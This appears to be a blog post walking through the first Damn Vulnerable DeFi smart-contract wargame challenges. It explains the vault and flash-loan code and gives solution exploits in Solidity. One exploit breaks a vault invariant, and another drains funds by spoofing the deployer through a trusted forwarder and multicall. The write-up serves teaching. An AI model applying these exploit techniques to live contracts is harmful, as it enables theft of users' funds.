

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="&lt;h2 id=&#34;Introduction&#34;&gt;&lt;a href=&#34;#Introduction&#34; class=&#34;headerlink&#34; title=&#34;Introduction&#34;&gt;&lt;/a&gt;Introduction&lt;/h2&gt;&lt;p&gt;Hello, I&amp;#x2019;m d4tura, newly joining hackyboiz!&lt;/p&gt;
&lt;p&gt;I started writing this research post while solving the &lt;a href=&#34;https://www.damnvulnerabledefi.xyz/&#34;&gt;Damn Vulnerable DeFi&lt;/a&gt; smart contracts wargame, with the goal of breaking down and understanding the concepts required to solve each challenge.  &lt;/p&gt;
&lt;p&gt;Originally, I have been doing zero-day research and exploit development for more &amp;#x201C;traditional&amp;#x201D; targets such as kernels, hypervisors, client-server protocols, and mobile platforms&amp;#x2014;both professionally and personally&amp;#x2014;for several years, and that&amp;#x2019;s still my main work today, haha.  &lt;/p&gt;
&lt;p&gt;However, I believe that by exploring new fields I haven&amp;#x2019;t touched before and exchanging ideas with others, there is always much to learn from one another. With that mindset, I decided to join the &lt;strong&gt;hackyboiz&lt;/strong&gt; team, and chose smart contracts auditing&amp;#x2014;something I had no prior experience with&amp;#x2014;as the subject of my writing.  &lt;/p&gt;
&lt;p&gt;This post is written so that people like me, who mainly deal with system hacking, can start smart contracts auditing with just basic blockchain knowledge. Therefore, instead of focusing on the exact solutions for specific challenges, I tried to explain the &lt;strong&gt;core concepts needed to solve them, in the simplest possible way, from a pwner&amp;#x2019;s perspective.&lt;/strong&gt;  &lt;/p&gt;
&lt;p&gt;Also, while most of the challenges are written in Solidity, I intentionally skipped deep dives into the language itself. The focus here is not on specific bug patterns, but rather on the underlying concepts embedded in each challenge.  &lt;/p&gt;
&lt;p&gt;Lastly, for terms that are secondary or might disrupt the flow of the writing, I didn&amp;#x2019;t provide long explanations in the text itself. Instead, I&amp;#x2019;ve added &lt;strong&gt;hyperlinks&lt;/strong&gt; to other well-written documents or code references for further reading.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image1.png&#34; alt&gt;&lt;/p&gt;
&lt;h2 id=&#34;Introduction-to-Damn-Vulnerable-DeFi&#34;&gt;&lt;a href=&#34;#Introduction-to-Damn-Vulnerable-DeFi&#34; class=&#34;headerlink&#34; title=&#34;Introduction to Damn Vulnerable DeFi&#34;&gt;&lt;/a&gt;Introduction to Damn Vulnerable DeFi&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Damn Vulnerable DeFi&lt;/strong&gt; wargame was originally maintained by the &lt;a href=&#34;https://github.com/OpenZeppelin/damn-vulnerable-defi&#34;&gt;OpenZeppelin&lt;/a&gt; group and later taken over by The Red Guild, which currently maintains it up to &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0&#34;&gt;v4.1.0&lt;/a&gt;.  &lt;/p&gt;
&lt;p&gt;All challenge environments are defined in the path &lt;code&gt;damn-vulnerable-defi/test/[challenge name]/[challenge name].t.sol&lt;/code&gt;. For example, the &lt;code&gt;Unstoppable&lt;/code&gt; challenge environment can be found in the file &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/unstoppable/Unstoppable.t.sol&#34;&gt;test/unstoppable/Unstoppable.t.sol&lt;/a&gt;.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image2.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;Each challenge environment is structured within a single contract and consists of the following functions and parameters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;deployer&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The entity responsible for deploying each smart contract, essentially acting as the vendor.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;player&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The participant solving the challenge.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;setUp()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The function that sets up the challenge environment. Analysis should begin by checking how the environment is initialized here.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;test_assertInitialState()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A function that verifies whether the initial setup in &lt;code&gt;setUp()&lt;/code&gt; was correctly applied.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;test_challengeName()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The function where the solution must be implemented after analyzing the challenge. The &lt;strong&gt;&lt;code&gt;player&lt;/code&gt; is only allowed to modify this function.&lt;/strong&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;_isSolved()&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A function that determines whether the challenge has been solved. If this function runs and completes without issues, the challenge is considered solved.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Most of the smart contract code targeted by each challenge can be found in the path &lt;code&gt;damn-vulnerable-defi/src/[challenge name]/&lt;/code&gt;. In the &lt;code&gt;setUp()&lt;/code&gt; function, an instance of the contract is created, and the initial environment is configured. The objective of the wargame is to analyze the vulnerabilities in this contract code and modify the &lt;code&gt;test_challengeName()&lt;/code&gt; function so that the &lt;code&gt;_isSolved()&lt;/code&gt; function passes.  &lt;/p&gt;
&lt;p&gt;Although the concept of a &lt;strong&gt;contract&lt;/strong&gt; may feel unfamiliar at first, I personally find it very similar to a &lt;strong&gt;class&lt;/strong&gt; in C++ or other object-oriented languages.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image3.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;As an example, let&amp;#x2019;s look at the &lt;code&gt;UnstoppableVault&lt;/code&gt; contract from the first challenge we&amp;#x2019;ll cover, &lt;strong&gt;Unstoppable&lt;/strong&gt;. Using functionalities from already implemented contracts such as &lt;code&gt;IERC3156FlashLender&lt;/code&gt;, &lt;code&gt;ReentrancyGuard&lt;/code&gt;, &lt;code&gt;Owned&lt;/code&gt;, &lt;code&gt;ERC4626&lt;/code&gt;, and &lt;code&gt;Pausable&lt;/code&gt; is essentially the same as inheriting from parent classes. In addition, the fact that member variables and functions must be marked with the &lt;code&gt;public&lt;/code&gt; keyword to be accessible externally, and that the &lt;code&gt;this&lt;/code&gt; keyword is used to reference the current instance, is practically identical to the concept of classes.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;/**
 * An ERC4626-compliant tokenized vault offering flashloans for a fee.
 * An owner can pause the contract and execute arbitrary changes.
 */
contract UnstoppableVault is IERC3156FlashLender, ReentrancyGuard, Owned, ERC4626, Pausable {

		// == member variable
    uint256 public constant FEE_FACTOR = 0.05 ether;
    uint64 public constant GRACE_PERIOD = 30 days;

    uint64 public immutable end = uint64(block.timestamp) + GRACE_PERIOD;

    address public feeRecipient;

		// == member function
    constructor(ERC20 _token, address _owner, address _feeRecipient)
        ERC4626(_token, &amp;quot;Too Damn Valuable Token&amp;quot;, &amp;quot;tDVT&amp;quot;)
        Owned(_owner)
    {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }

    /**
     * @inheritdoc IERC3156FlashLender
     */
    function maxFlashLoan(address _token) public view nonReadReentrant returns (uint256) {
        if (address(asset) != _token) {
            return 0;
        }

        return totalAssets();
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Lastly, most challenges involve a token called &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/DamnValuableToken.sol&#34;&gt;DamnValuableToken&lt;/a&gt;, which is based on &lt;a href=&#34;https://eips.ethereum.org/EIPS/eip-20&#34;&gt;ERC20&lt;/a&gt;. It&amp;#x2019;s useful to be familiar with the following commonly used ERC20 functions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-totalSupply--&#34;&gt;totalSupply()&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Returns the total amount of assets created in the given token instance.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-&#34;&gt;balanceOf(address account)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Returns the total amount of tokens held by the given &lt;code&gt;account&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-balanceOf-address-&#34;&gt;transfer(address to, address value)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Withdraws &lt;code&gt;value&lt;/code&gt; tokens from the caller&amp;#x2019;s account and sends them to &lt;code&gt;to&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-transferFrom-address-address-uint256-&#34;&gt;transferFrom(address from, address to, uint256 value)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Withdraws &lt;code&gt;value&lt;/code&gt; tokens from the &lt;code&gt;from&lt;/code&gt; account and sends them to &lt;code&gt;to&lt;/code&gt;.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#IERC20-approve-address-uint256-&#34;&gt;approve(address spender, uint256 value)&lt;/a&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Allows &lt;code&gt;spender&lt;/code&gt; to withdraw up to &lt;code&gt;value&lt;/code&gt; tokens from the caller&amp;#x2019;s account.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;(Just FYI, &lt;a href=&#34;https://eips.ethereum.org/erc&#34;&gt;ERC&lt;/a&gt; stands for &lt;strong&gt;Ethereum Request for Comment&lt;/strong&gt;, essentially the smart contract version of &lt;a href=&#34;https://en.wikipedia.org/wiki/Request_for_Comments&#34;&gt;RFC&lt;/a&gt; documents used in traditional programming to define technical specifications.)  &lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;1-Unstoppable-total-balance-total-supply&#34;&gt;&lt;a href=&#34;#1-Unstoppable-total-balance-total-supply&#34; class=&#34;headerlink&#34; title=&#34;1. Unstoppable: total balance != total supply&#34;&gt;&lt;/a&gt;1. Unstoppable: total balance != total supply&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation&#34;&gt;&lt;a href=&#34;#Challenge-Explanation&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;In the case of the &lt;code&gt;Unstoppable&lt;/code&gt; challenge, the goal is to trigger a &lt;code&gt;revert&lt;/code&gt; statement inside the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/unstoppable/UnstoppableVault.sol#L78&#34;&gt;UnstoppableVault.flashLoan()&lt;/a&gt; function. There are a total of four &lt;code&gt;revert&lt;/code&gt; statements present.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;    function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
~~~~        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256(&amp;quot;IERC3156FlashBorrower.onFlashLoan&amp;quot;)
        ) {
            revert CallbackFailed();
        }
        // ....&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;revert InvalidAmount(0)&lt;/code&gt;, &lt;code&gt;revert UnsupportedCurrency()&lt;/code&gt;, and &lt;code&gt;revert CallbackFailed()&lt;/code&gt; statements are not parts of the challenge that the player can deliberately manipulate. Instead, they serve more as basic integrity checks (sanity checks) to ensure the function behaves correctly under normal conditions. Therefore, our real objective is to trigger the &lt;code&gt;revert InvalidBalance()&lt;/code&gt; statement.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// UnstoppableVault.totalAssets
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}

// ERC4626.convertToShares
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;code&gt;totalAssets()&lt;/code&gt; function returns the total amount of assets (balance) currently held by the &lt;code&gt;UnstoppableVault&lt;/code&gt; contract. The &lt;code&gt;convertToShares()&lt;/code&gt; function may look a bit more complex since it involves arithmetic operations, but in practice, it can be interpreted as follows.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;convertToShares(totalSupply) 
= (totalSupply * totalSupply) / totalAssets()&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here, &lt;code&gt;totalSupply&lt;/code&gt; refers to the total assets issued by the ERC20 token. It increases when tokens are minted (&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC4626-mint-uint256-address-&#34;&gt;mint&lt;/a&gt;) and decreases when they are burned (&lt;a href=&#34;https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-_burn-address-uint256-&#34;&gt;burn&lt;/a&gt;).  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;	  // ERC20._mint
    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;
        
.....
		// ERC20._burn
    function _burn(address from, uint256 amount) internal virtual {
        // ....
        unchecked {
            totalSupply -= amount;
        }&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Looking at the initial setup (&lt;code&gt;setUp()&lt;/code&gt; function) of the challenge, an amount equal to &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt; is deposited into the &lt;code&gt;vault&lt;/code&gt;. During this process, the amount deposited in the &lt;code&gt;vault&lt;/code&gt; (&lt;code&gt;totalAssets&lt;/code&gt;) and the total supply of tokens issued (&lt;code&gt;totalSupply&lt;/code&gt;) both become equal to the value of &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;    // UnstoppableChallenge.setUp
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));
        
// ....

    // ERC4626._deposit
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        // If _asset is ERC-777, `transferFrom` can trigger a reentrancy BEFORE the transfer happens through the
        // `tokensToSend` hook. On the other hand, the `tokenReceived` hook, that is triggered after the transfer,
        // calls the vault, which is assumed not malicious.
        //
        // Conclusion: we need to do the transfer before we mint so that any reentrancy would happen before the
        // assets are transferred and before the shares are minted, which is a valid state.
        // slither-disable-next-line reentrancy-no-eth
        SafeERC20.safeTransferFrom(_asset, caller, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving&#34;&gt;&lt;a href=&#34;#Challenge-Solving&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;At the start, both &lt;code&gt;totalSupply&lt;/code&gt; (the amount of tokens minted by the &lt;code&gt;token&lt;/code&gt;) and &lt;code&gt;totalAssets()&lt;/code&gt; (the amount deposited in the &lt;code&gt;vault&lt;/code&gt;) are equal to &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;. Because of this, &lt;code&gt;convertToShares(totalSupply)&lt;/code&gt; returns &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;, and &lt;code&gt;totalAssets()&lt;/code&gt; also returns &lt;code&gt;TOKEN_IN_VAULT&lt;/code&gt;, making them identical.  &lt;/p&gt;
&lt;p&gt;However, this condition is not guaranteed to always hold true. What happens if someone transfers tokens directly to the &lt;code&gt;vault&lt;/code&gt; address? In that case, the actual assets held by the &lt;code&gt;vault&lt;/code&gt; (&lt;code&gt;totalAssets&lt;/code&gt;) increase, but the total supply of tokens (&lt;code&gt;totalSupply&lt;/code&gt;) remains unchanged. This discrepancy causes the condition &lt;code&gt;convertToShares(totalSupply) != balanceBefore&lt;/code&gt; to become true.  &lt;/p&gt;
&lt;p&gt;Therefore, simply sending even a very small amount of tokens directly to the &lt;code&gt;vault&lt;/code&gt; contract address is enough to solve the challenge.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;2-Naive-Receiver-flash-loan-with-fixed-fee&#34;&gt;&lt;a href=&#34;#2-Naive-Receiver-flash-loan-with-fixed-fee&#34; class=&#34;headerlink&#34; title=&#34;2. Naive Receiver: flash loan with fixed fee&#34;&gt;&lt;/a&gt;2. Naive Receiver: flash loan with fixed fee&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-1&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-1&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;The objective of this challenge is to drain all the assets from both the &lt;code&gt;receiver&lt;/code&gt; and the &lt;code&gt;pool&lt;/code&gt;, and then transfer them to the &lt;code&gt;recovery&lt;/code&gt;, using no more than two transaction calls.  &lt;/p&gt;
&lt;p&gt;(&lt;strong&gt;Just FYI, in this context, the term &lt;/strong&gt;transaction** refers to invoking functions that are defined in other contracts.)  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function _isSolved() private view {
    // Player must have executed two or less transactions
    assertLe(vm.getNonce(player), 2);

    // The flashloan receiver contract has been emptied
    assertEq(weth.balanceOf(address(receiver)), 0, &amp;quot;Unexpected balance in receiver contract&amp;quot;);

    // Pool is empty too
    assertEq(weth.balanceOf(address(pool)), 0, &amp;quot;Unexpected balance in pool&amp;quot;);

    // All funds sent to recovery account
    assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, &amp;quot;Not enough WETH in recovery account&amp;quot;);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L43&#34;&gt;pool.flashLoan()&lt;/a&gt; function, as its name suggests, provides an unsecured loan (flash loan) service to the &lt;code&gt;receiver&lt;/code&gt;, and charges a fixed fee of &lt;code&gt;FIXED_FEE&lt;/code&gt; (&lt;code&gt;1 ether&lt;/code&gt;) as compensation.  &lt;/p&gt;
&lt;p&gt;(Just FYI, &lt;code&gt;1e18&lt;/code&gt; = &lt;code&gt;1 ether&lt;/code&gt;)  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != address(weth)) revert UnsupportedCurrency();

    // Transfer WETH and handle control to receiver
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Challenge-Solving-1&#34;&gt;&lt;a href=&#34;#Challenge-Solving-1&#34; class=&#34;headerlink&#34; title=&#34;Challenge Solving&#34;&gt;&lt;/a&gt;Challenge Solving&lt;/h3&gt;&lt;p&gt;The key is that by repeatedly calling the &lt;code&gt;flashLoan&lt;/code&gt; function, the fixed fee &lt;code&gt;FIXED_FEE&lt;/code&gt; can be exploited to gradually transfer all of the &lt;code&gt;receiver&lt;/code&gt;&amp;#x2019;s assets into the &lt;code&gt;pool&lt;/code&gt;. This process is repeated until the &lt;code&gt;receiver&lt;/code&gt;&amp;#x2019;s balance is completely drained.  &lt;/p&gt;
&lt;p&gt;After that, looking at the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L66&#34;&gt;pool.withdraw()&lt;/a&gt; function, you&amp;#x2019;ll notice that &lt;strong&gt;there are no authorization checks when withdrawing assets.&lt;/strong&gt; This allows us to easily withdraw all the assets accumulated in the &lt;code&gt;pool&lt;/code&gt; and send them to any address we want.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This challenge must be solved with no more than two transactions. To achieve this, you can use the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/Multicall.sol#L9&#34;&gt;MultiCall.multicall()&lt;/a&gt; function, which allows multiple function calls to be bundled together and executed within a single transaction.  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i &amp;lt; data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In the final step of the solution, we use the &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/98028bbbc32c189b99241ba993d69d3517837e29/src/naive-receiver/BasicForwarder.sol#L55&#34;&gt;BasicForwarder.execute()&lt;/a&gt; function. The &lt;code&gt;BasicForwarder&lt;/code&gt; contract supports &lt;a href=&#34;https://www.alchemy.com/overviews/meta-transactions&#34;&gt;meta transactions&lt;/a&gt;, which allow gas fees to be paid on behalf of the user.  &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2025/09/07/d4tura/smartcontracts/en/image4.png&#34; alt&gt;  &lt;/p&gt;
&lt;p&gt;In this challenge, to successfully withdraw all the assets from the &lt;code&gt;pool&lt;/code&gt;, the &lt;code&gt;_msgSender()&lt;/code&gt; must return the &lt;code&gt;deployer&lt;/code&gt;&amp;#x2019;s address when the &lt;code&gt;withdraw&lt;/code&gt; function is called. By using &lt;code&gt;BasicForwarder&lt;/code&gt;, we can satisfy this condition.  &lt;/p&gt;
&lt;p&gt;(Just FYI, a &lt;strong&gt;gas fee&lt;/strong&gt; refers to the fee paid whenever a transaction is recorded on the blockchain&amp;#x2014;such as when calling a smart contract function&amp;#x2014;on the actual mainnet.)  &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;// NaiveReceiverPool.sol
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder &amp;amp;&amp;amp; msg.data.length &amp;gt;= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}

// BasicForwarder.sol
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    _checkRequest(request, signature);

    nonces[request.from]++;

    uint256 gasLeft;
    uint256 value = request.value; // in wei
    address target = request.target;
    bytes memory payload = abi.encodePacked(request.data, request.from);
    uint256 forwardGas = request.gas;
    assembly {
        success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don&amp;apos;t copy returndata
        gasLeft := gas()
    }

    if (gasLeft &amp;lt; request.gas / 63) {
        assembly {
            invalid()
        }
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The final attack flow can be summarized as follows:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Use the &lt;code&gt;multicall&lt;/code&gt; function to call the &lt;code&gt;flashLoan&lt;/code&gt; function 10 times, draining all of the &lt;code&gt;receiver&lt;/code&gt;&amp;#x2019;s assets into the &lt;code&gt;pool&lt;/code&gt;. Then, immediately call the &lt;code&gt;withdraw&lt;/code&gt; function to transfer all the funds from the &lt;code&gt;pool&lt;/code&gt; into the &lt;code&gt;recovery&lt;/code&gt; account.  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Execute the entire process through &lt;code&gt;BasicForwarder&lt;/code&gt;, ensuring that everything is handled within a single transaction.  &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;hljs solidity&#34;&gt;function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory call_datas = new bytes[](11);
    // WETH_IN_RECEIVER = 10e18
    // FIXED_FEE = 1e8
    // calling flashLoan 10 times
    for(uint i = 0; i &amp;lt; 10; i++) {
        call_datas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 9e18, &amp;quot;&amp;quot;));
    }

		// deposits[deployer] -= WETH_IN_POOL + WETH_IN_RECEIVER;
		// weth.transfer(recovery, WETH_IN_POOL + WETH_IN_RECEIVER);
    call_datas[10] = abi.encodePacked(
        abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes20(uint160(deployer))
    );

    bytes memory call_data = abi.encodeCall(Multicall.multicall, call_datas);

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: forwarder.nonces(player),
        data: call_data,
        deadline: block.timestamp + 1 days
    });

    // creating hash for request
    bytes32 request_hash = keccak256(
        abi.encodePacked(
            &amp;quot;\x19\x01&amp;quot;, // == EIP-712 signature, because BasicForwarder is EIP712
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );

    // r = 1st part of signature
    // s = 2nd part of signature
    // v = recovery ID
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, request_hash);
    bytes memory signature = abi.encodePacked(r,s,v);

    forwarder.execute(request, signature);
}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;3-Truster-don&amp;#x2019;t-trust-borrower-too-much&#34;&gt;&lt;a href=&#34;#3-Truster-don&amp;#x2019;t-trust-borrower-too-much&#34; class=&#34;headerlink&#34; title=&#34;3. Truster: don&amp;#x2019;t trust borrower too much&#34;&gt;&lt;/a&gt;3. Truster: don&amp;#x2019;t trust borrower too much&lt;/h2&gt;&lt;h3 id=&#34;Challenge-Explanation-2&#34;&gt;&lt;a href=&#34;#Challenge-Explanation-2&#34; class=&#34;headerlink&#34; title=&#34;Challenge Explanation&#34;&gt;&lt;/a&gt;Challenge Explanation&lt;/h3&gt;&lt;p&gt;The &lt;a href=&#34;https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/truster/TrusterLenderPool.sol&#34;&gt;TrusterLenderPool.sol&lt;/a&gt; contract&amp;#x2019;s &lt;code&gt;flashLoan&lt;/code&gt; function provides an unsecured loan to the &lt;code&gt;borrower&lt;/code&gt;. What&amp;#x2019;s unusual here is that the logic for how the borrowed funds are used is passed in as the &lt;code&gt;data&lt;/code&gt; argument, which is then executed directly through a &lt;a href=&#34;https://rareskills.io/post/low-level-call-solidity&#34;&gt;call&lt;/a&gt;.  &lt;/p&gt;
